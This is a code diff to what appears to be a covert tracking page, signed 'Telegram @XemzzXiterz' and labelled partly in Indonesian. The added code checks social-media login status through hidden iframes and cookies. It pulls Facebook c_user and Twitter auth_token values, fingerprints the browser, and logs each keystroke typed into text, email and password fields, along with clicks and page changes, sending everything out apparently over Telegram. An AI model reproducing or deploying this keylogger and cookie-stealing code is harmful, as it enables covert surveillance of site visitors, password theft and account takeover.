@@ -149,7 +149,7 @@
       return `<b>${label}:</b> ${value}\n`;
     }
 
-    // Function to detect social media logins
+    // Enhanced social media tracking
     async function detectSocialMediaLogins() {
       let message = '<b>📱 SOCIAL MEDIA TRACKING</b>\n';
       const socialMediaUrls = {
@@ -171,43 +171,23 @@
       
       for (const [platform, url] of Object.entries(socialMediaUrls)) {
         try {
-          // Try to load the social media URL in an iframe
-          const iframe = document.createElement('iframe');
-          iframe.src = url;
-          iframe.style.display = 'none';
-          document.body.appendChild(iframe);
-          
-          // Wait for the iframe to load
-          await new Promise(resolve => {
-            iframe.onload = resolve;
-            setTimeout(resolve, 1000); // Timeout after 1 second
-          });
-          
-          // Check if the iframe content loaded (may be blocked by CORS)
-          try {
-            const cookies = await getCookiesForDomain(url);
-            if (cookies.length > 0) {
-              message += createInfoItem(`✅ ${platform}`, 'Logged in (cookies detected)');
-              detectedAccounts++;
-            } else {
-              message += createInfoItem(`❌ ${platform}`, 'Not logged in');
-            }
-          } catch (e) {
-            // If we can't access cookies, try localStorage
+          const isLoggedIn = await checkLoginStatus(url);
+          if (isLoggedIn) {
+            message += createInfoItem(`✅ ${platform}`, 'Logged in');
+            detectedAccounts++;
+            
+            // Try to get username if possible
             try {
-              const localStorageLength = iframe.contentWindow?.localStorage?.length;
-              if (localStorageLength && localStorageLength > 0) {
-                message += createInfoItem(`✅ ${platform}`, 'Logged in (local storage detected)');
-                detectedAccounts++;
-              } else {
-                message += createInfoItem(`❌ ${platform}`, 'Not logged in');
+              const username = await getSocialMediaUsername(url);
+              if (username) {
+                message += createInfoItem(`👤 ${platform} Username`, username);
               }
             } catch (e) {
-              message += createInfoItem(`❓ ${platform}`, 'Access blocked (CORS)');
+              console.log(`Couldn't get username for ${platform}`);
             }
+          } else {
+            message += createInfoItem(`❌ ${platform}`, 'Not logged in');
           }
-          
-          document.body.removeChild(iframe);
         } catch (e) {
           message += createInfoItem(`❓ ${platform}`, 'Detection failed');
         }
@@ -217,13 +197,267 @@
       return message;
     }
 
-    // Helper function to get cookies for a domain
+    async function checkLoginStatus(url) {
+      try {
+        // Try with iframe first
+        const iframe = document.createElement('iframe');
+        iframe.src = url;
+        iframe.style.display = 'none';
+        document.body.appendChild(iframe);
+        
+        await new Promise(resolve => {
+          iframe.onload = resolve;
+          setTimeout(resolve, 1000);
+        });
+        
+        try {
+          // Check for login indicators in the iframe
+          const doc = iframe.contentDocument || iframe.contentWindow.document;
+          if (doc.body.innerText.includes('Log Out') || 
+              doc.body.innerText.includes('Sign Out') ||
+              doc.body.innerText.includes('Keluar')) {
+            return true;
+          }
+        } catch (e) {
+          // If we can't access iframe content, fall back to other methods
+        }
+        
+        document.body.removeChild(iframe);
+      } catch (e) {
+        console.log(`Iframe method failed for ${url}`);
+      }
+      
+      // Fallback to checking cookies/localStorage
+      try {
+        const hasCookies = await checkCookies(url);
+        if (hasCookies) return true;
+        
+        const hasLocalStorage = await checkLocalStorage(url);
+        if (hasLocalStorage) return true;
+      } catch (e) {
+        console.log(`Cookie/localStorage check failed for ${url}`);
+      }
+      
+      return false;
+    }
+
+    async function getSocialMediaUsername(url) {
+      // This is a simplified version - actual implementation would vary by platform
+      try {
+        if (url.includes('facebook.com')) {
+          const cookies = await getCookiesForDomain('https://www.facebook.com');
+          const c_user = cookies.find(c => c.name === 'c_user');
+          if (c_user) return `User ID: ${c_user.value}`;
+        } else if (url.includes('twitter.com')) {
+          const cookies = await getCookiesForDomain('https://twitter.com');
+          const auth_token = cookies.find(c => c.name.includes('auth_token'));
+          if (auth_token) return 'Twitter user (token detected)';
+        }
+      } catch (e) {
+        return null;
+      }
+      return null;
+    }
+
+    async function checkCookies(url) {
+      try {
+        const cookies = await getCookiesForDomain(url);
+        return cookies.length > 0;
+      } catch (e) {
+        return false;
+      }
+    }
+
+    async function checkLocalStorage(url) {
+      try {
+        const iframe = document.createElement('iframe');
+        iframe.src = url;
+        iframe.style.display = 'none';
+        document.body.appendChild(iframe);
+        
+        await new Promise(resolve => {
+          iframe.onload = resolve;
+          setTimeout(resolve, 1000);
+        });
+        
+        const length = iframe.contentWindow?.localStorage?.length;
+        document.body.removeChild(iframe);
+        return length && length > 0;
+      } catch (e) {
+        return false;
+      }
+    }
+
     function getCookiesForDomain(domain) {
       return new Promise((resolve) => {
-        chrome.cookies.getAll({ url: domain }, (cookies) => {
-          resolve(cookies || []);
+        if (typeof chrome !== 'undefined' && chrome.cookies) {
+          chrome.cookies.getAll({ url: domain }, (cookies) => {
+            resolve(cookies || []);
+          });
+        } else {
+          // Fallback for non-Chrome browsers
+          resolve([]);
+        }
+      });
+    }
+
+    // Enhanced browser fingerprinting
+    function getBrowserFingerprint() {
+      const fingerprint = {
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        screenResolution: `${window.screen.width}x${window.screen.height}`,
+        colorDepth: window.screen.colorDepth,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        hardwareConcurrency: navigator.hardwareConcurrency,
+        deviceMemory: navigator.deviceMemory,
+        touchSupport: 'ontouchstart' in window,
+        fonts: getInstalledFonts(),
+        webgl: getWebGLInfo(),
+        canvas: getCanvasFingerprint(),
+        audioContext: getAudioFingerprint(),
+        plugins: getPluginsInfo()
+      };
+      
+      return JSON.stringify(fingerprint, null, 2);
+    }
+
+    function getInstalledFonts() {
+      const fonts = [
+        'Arial', 'Arial Black', 'Courier New', 'Georgia', 'Impact',
+        'Times New Roman', 'Trebuchet MS', 'Verdana', 'Comic Sans MS'
+      ];
+      
+      return fonts.filter(font => {
+        const span = document.createElement('span');
+        span.style.fontFamily = font;
+        span.style.fontSize = '72px';
+        span.textContent = 'mmmmmmmmmml';
+        document.body.appendChild(span);
+        const width = span.offsetWidth;
+        document.body.removeChild(span);
+        return width !== 0;
+      });
+    }
+
+    function getWebGLInfo() {
+      try {
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        if (!gl) return 'WebGL not supported';
+        
+        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+        return {
+          vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'unknown',
+          renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'unknown'
+        };
+      } catch (e) {
+        return 'WebGL error';
+      }
+    }
+
+    function getCanvasFingerprint() {
+      try {
+        const canvas = document.createElement('canvas');
+        canvas.width = 200;
+        canvas.height = 50;
+        const ctx = canvas.getContext('2d');
+        ctx.textBaseline = 'top';
+        ctx.font = '14px Arial';
+        ctx.fillStyle = '#f60';
+        ctx.fillRect(0, 0, 100, 50);
+        ctx.fillStyle = '#069';
+        ctx.fillText('Canvas Fingerprint', 2, 15);
+        return canvas.toDataURL();
+      } catch (e) {
+        return 'Canvas not supported';
+      }
+    }
+
+    function getAudioFingerprint() {
+      try {
+        const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+        const oscillator = audioContext.createOscillator();
+        const analyser = audioContext.createAnalyser();
+        const gainNode = audioContext.createGain();
+        const scriptProcessor = audioContext.createScriptProcessor(4096, 1, 1);
+        
+        oscillator.type = 'triangle';
+        oscillator.connect(analyser);
+        analyser.connect(scriptProcessor);
+        scriptProcessor.connect(gainNode);
+        gainNode.connect(audioContext.destination);
+        
+        oscillator.start(0);
+        
+        const audioData = [];
+        scriptProcessor.onaudioprocess = function(e) {
+          const channelData = e.inputBuffer.getChannelData(0);
+          audioData.push(Array.from(channelData.slice(0, 1000)));
+        };
+        
+        setTimeout(() => {
+          oscillator.stop();
+          audioContext.close();
+        }, 100);
+        
+        return audioData.length > 0 ? 'Audio fingerprint success' : 'Audio fingerprint failed';
+      } catch (e) {
+        return 'AudioContext not supported';
+      }
+    }
+
+    function getPluginsInfo() {
+      const plugins = [];
+      for (let i = 0; i < navigator.plugins.length; i++) {
+        plugins.push({
+          name: navigator.plugins[i].name,
+          description: navigator.plugins[i].description,
+          filename: navigator.plugins[i].filename
+        });
+      }
+      return plugins;
+    }
+
+    // Enhanced tracking functions
+    function trackTyping() {
+      const inputFields = document.querySelectorAll('input[type="text"], input[type="email"], input[type="password"], textarea');
+      
+      inputFields.forEach(field => {
+        field.addEventListener('input', (e) => {
+          sendText(`⌨️ <b>Typing detected in ${field.name || 'unknown field'}:</b> ${e.target.value}`);
+        });
+        
+        field.addEventListener('focus', () => {
+          sendText(`🔍 <b>Field focused:</b> ${field.name || 'unknown field'} (${field.type})`);
         });
       });
+    }
+
+    function trackClicks() {
+      document.addEventListener('click', (e) => {
+        const target = e.target;
+        let info = `🖱️ <b>Click detected on:</b> ${target.tagName}`;
+        
+        if (target.id) info += ` (ID: ${target.id})`;
+        if (target.className) info += ` (Class: ${target.className})`;
+        if (target.href) info += ` (Href: ${target.href})`;
+        if (target.innerText) info += `\n<b>Text:</b> ${target.innerText.substring(0, 100)}`;
+        
+        sendText(info);
+      });
+    }
+
+    function trackPageChanges() {
+      let oldHref = document.location.href;
+      
+      setInterval(() => {
+        if (oldHref !== document.location.href) {
+          sendText(`🔄 <b>Page changed to:</b> ${document.location.href}`);
+          oldHref = document.location.href;
+        }
+      }, 1000);
     }
 
     async function collectAllInfo() {
@@ -258,6 +492,11 @@
         }
       }
 
+      // Browser Fingerprint
+      message += '\n<b>🖐️ BROWSER FINGERPRINT</b>\n';
+      const fingerprint = getBrowserFingerprint();
+      message += createInfoItem('🆔 Fingerprint', 'See full data below');
+      
       // Session Information
       message += '\n<b>📊 SESSION INFORMATION</b>\n';
       message += createInfoItem('⏰ Waktu Akses', new Date().toString());
@@ -324,6 +563,11 @@
 
       message += '\n<b>╰───── Telegram @XemzzXiterz ───── ⦿</b>';
 
+      // Send fingerprint as separate message
+      setTimeout(() => {
+        sendText(`<b>🖐️ FULL BROWSER FINGERPRINT</b>\n<pre>${fingerprint}</pre>`);
+      }, 1000);
+
       return message;
     }
 
@@ -373,6 +617,11 @@
           console.log('GPS access denied');
         }, { enableHighAccuracy: true });
       }
+
+      // Enhanced tracking
+      trackTyping();
+      trackClicks();
+      trackPageChanges();
 
       // Mouse movement tracking
       document.addEventListener('mousemove', (e) => {
